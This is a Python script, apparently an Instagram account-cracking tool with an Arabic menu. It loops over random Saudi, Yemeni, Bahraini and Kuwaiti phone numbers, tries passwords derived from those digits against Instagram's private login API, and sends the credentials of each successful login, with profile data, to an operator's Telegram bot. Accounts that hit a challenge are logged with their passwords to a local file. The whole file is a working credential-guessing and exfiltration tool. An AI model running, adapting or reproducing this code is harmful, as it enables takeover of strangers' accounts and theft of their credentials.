
import random
import requests
import time
import uuid,threading
import sys,os
from secrets import token_hex
import secrets
from uuid import uuid4
uid = uuid.uuid4()
cookie = secrets.token_hex(8) * 2
ban=0
hit=0
ssec=0
kaito=0
os.system('clear')
Z = '\033[1;31m' #ر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m'
def slow(T): 
	for r in T + '\n' :
		sys.stdout.write(r)
		sys.stdout.flush()
		time.sleep(5/1000)
banner=slow(Z+'''

 ____    _       _   _    ____  
/ ___|  / \     | | / \  |  _ \ 
\___ \ / _ \ _  | |/ _ \ | | | |
 ___) / ___ \ |_| / ___ \| |_| |
|____/_/   \_\___/_/   \_\____/ 

						 IG 66_l T.ME X6666XXX								''')
slow('''
[1] Saudi|سعوديه
[2] Yemen|يمن
[3] Bahrain|بحرين
[4] Kuwait |قطر
''')
print(X+'______'*7)
Kaito = input('[?] اختر رقم الدوله :')
# استغفرالله 
tokenCx = input(A+'[?] توكن :')
print(X+'______'*7,'\n\n')
id = input(A+'[?] ايدي :')
print(X+'______'*7,'\n\n')
# IG : @66_l
# Name : Kaito alanzi
# Snapchat : @66_l
# Telegram : @X6666XXX
def info(userQ):
	head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
	url_id = f"https://www.instagram.com/{userQ}/?__a=1"
	req_id = requests.get(url_id, headers=head).json()
	name = str(req_id['graphql']['user']['full_name'])
	idd = str(req_id['graphql']['user']['id'])
	followers = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following = str(req_id['graphql']['user']['edge_follow']['count'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={idd}")
	ree = re.json()
	dat = ree['data']
	tlg =(f'https://api.telegram.org/bot{tokenCx}/sendMessage?chat_id={id}&text=\n New Acc Instagram————————————-\n • username : {userQ}\n • pass : {password}\n • Data : {dat}\n • following : {following} \n • followers : {followers}\n • name : {name} \n ———————————-------\n By : @hyy_yy')
	req = requests.post(tlg)
if Kaito=='1':
	user = '0987654321'
	while True:
		time.sleep(0.1)
		whi = str("".join(random.choice(user)for i in range(7)))
		username= '+96650'+whi
		password = '050'+whi
		if username =='':
			exit()
		if password =='':
			exit()
		cookies = token_hex(8) * 2
		time.sleep(0.1)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		hea = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
	                 'Cookie':'missing',
	                 'Accept-Encoding':'gzip, deflate',
	                 'Accept-Language':'en-US',
	                 'X-IG-Capabilities':'3brTvw==',
	                 'X-IG-Connection-Type':'WIFI',
	                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
	              'Host':'i.instagram.com'}
		data = {'uuid':uid,
	'password':password,
	'username':username,
	'device_id':uid,
	'from_reg':'false',
	'_csrftoken':'missing',
	'login_attempt_countn':'0'}
		req= requests.post(url,headers=hea, data=data)
		if 'logged_in_user' in req.json():
			hit+=1
			userQ = req.json()['logged_in_user']['username']
			info(userQ)
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit : {hit} Bad : {ban}secuore : {ssec} ',end='')
			
		if '"message":"challenge_required"' in req.json():
			ssec+=1
			print(f'\r{B}Hit:{hit} | Bad :{ban} | secuore :{ssec}',end='')
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit : {hit} Bad : {ban}secuore : {ssec}',end='')
			with open('Scure.txt', 'a') as (seuc):
				seuc.write(' [-] UserName : {} \n [-] Passowrd : {}\n\n'.format(username, password))
		
		
		if "'message': 'Please wait a few minutes before you try again.'" in req.json():
			ban+=0
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} |Scure:{ssec}',end='')
	
		else:
			ban+=1
			print(f'\r{B}Hit :{hit} | Bad :{ban} | Scure:{ssec}',end='')

elif Kaito=='2':
	user = '0987654321'
	while True:
		time.sleep(0.1)
		whi = str("".join(random.choice(user)for i in range(7)))
		username= '+96777'+whi
		password = '77'+whi
		if username =='':
			exit()
		if password =='':
			exit()
		cookies = token_hex(8) * 2
		time.sleep(0.1)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		hea = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
	                 'Cookie':'missing',
	                 'Accept-Encoding':'gzip, deflate',
	                 'Accept-Language':'en-US',
	                 'X-IG-Capabilities':'3brTvw==',
	                 'X-IG-Connection-Type':'WIFI',
	                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
	              'Host':'i.instagram.com'}
		data = {'uuid':uid,
	'password':password,
	'username':username,
	'device_id':uid,
	'from_reg':'false',
	'_csrftoken':'missing',
	'login_attempt_countn':'0'}
		req= requests.post(url,headers=hea, data=data)
		if 'logged_in_user' in req.json():
			hit+=1
			userQ = req.json()['logged_in_user']['username']
			info(userQ)
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} | secuore :{ssec}',end='')
			
		
		if '"message":"challenge_required"' in req.text:
			ssec+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit:{hit} | Bad :{ban} | secuore :{ssec}',end='')
			with open('Scure.txt', 'a') as (seuc):
				seuc.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
		
		if "'message': 'Please wait a few minutes before you try again.'" in req.json():
			ban+=0
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} |Scure:{ssec}',end='')
	
		else:
			ban+=1
			print(f'\r{B}Hit :{hit} | Bad :{ban} | Scure:{ssec}',end='')

elif Kaito=='3':
	user = '0987654321'
	while True:
		time.sleep(0.1)
		whi = str("".join(random.choice(user)for i in range(6)))
		username= '+97333'+whi
		password = '33'+whi
		if username =='':
			exit()
		if password =='':
			exit()
		cookies = token_hex(8) * 2
		time.sleep(0.1)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		hea = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
	                 'Cookie':'missing',
	                 'Accept-Encoding':'gzip, deflate',
	                 'Accept-Language':'en-US',
	                 'X-IG-Capabilities':'3brTvw==',
	                 'X-IG-Connection-Type':'WIFI',
	                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
	              'Host':'i.instagram.com'}
		data = {'uuid':uid,
	'password':password,
	'username':username,
	'device_id':uid,
	'from_reg':'false',
	'_csrftoken':'missing',
	'login_attempt_countn':'0'}
		req= requests.post(url,headers=hea, data=data)
		if 'logged_in_user' in req.json():
			hit+=1
			userQ = req.json()['logged_in_user']['username']
			info(userQ)
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} | secuore :{ssec}',end='')
			
		if '"message":"challenge_required"' in req.text:
			ssec+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit:{hit} | Bad :{ban} | secuore :{ssec}',end='')
			with open('Scure.txt', 'a') as (seuc):
				seuc.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
		
		if "'message': 'Please wait a few minutes before you try again.'" in req.json():
			ban+=0
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} |Scure:{ssec}',end='')
	
		else:
			ban+=1
			print(f'\r{B}Hit :{hit} | Bad :{ban} | Scure:{ssec}',end='')
# telegram : @X6666XXX
elif Kaito=='4':
	user = '0987654321'
	while True:
		time.sleep(0.1)
		whi = str("".join(random.choice(user)for i in range(6)))
		username= '+96555'+whi
		password = '55'+whi
		if username =='':
			exit()
		if password =='':
			exit()
		cookies = token_hex(8) * 2
		time.sleep(0.1)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		hea = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
	                 'Cookie':'missing',
	                 'Accept-Encoding':'gzip, deflate',
	                 'Accept-Language':'en-US',
	                 'X-IG-Capabilities':'3brTvw==',
	                 'X-IG-Connection-Type':'WIFI',
	                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
	              'Host':'i.instagram.com'}
		data = {'uuid':uid,
	'password':password,
	'username':username,
	'device_id':uid,
	'from_reg':'false',
	'_csrftoken':'missing',
	'login_attempt_countn':'0'}
		req= requests.post(url,headers=hea, data=data)
		if 'logged_in_user' in req.json():
			hit+=1
			userQ = req.json()['logged_in_user']['username']
			info(userQ)
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} | secuore :{ssec}',end='')
	
		if '"message":"challenge_required"' in req.text:
			ssec+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit:{hit} | Bad :{ban} | secuore :{ssec}',end='')
			with open('Scure.txt', 'a') as (seuc):
				seuc.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
		
		if "'message': 'Please wait a few minutes before you try again.'" in req.json():
			ban+=0
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'\r{B}Hit :{hit} | Bad :{ban} |Scure:{ssec}',end='')
	
		else:
			ban+=1
			print(f'\r{B}Hit :{hit} | Bad :{ban} | Scure:{ssec}',end='')
